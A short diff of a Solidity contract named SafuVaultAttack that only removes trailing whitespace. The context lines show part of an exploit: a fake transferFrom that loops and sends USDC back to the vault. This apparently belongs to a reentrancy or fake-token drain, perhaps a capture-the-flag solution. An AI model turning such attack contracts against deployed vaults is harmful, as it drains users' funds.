@@ -40,7 +40,7 @@ contract SafuVaultAttack {
     function transferFrom(address from, address to, uint256 amount) external {
         if (loops < numOfLoops) {
             // we increment here because if we put it last it would not increment due to call to depositFor()
-            loops++; 
+            loops++;
 
             // transfer amount = usdcAmount to the msg.sender = SafuVault
             usdc.transfer(msg.sender, amount);
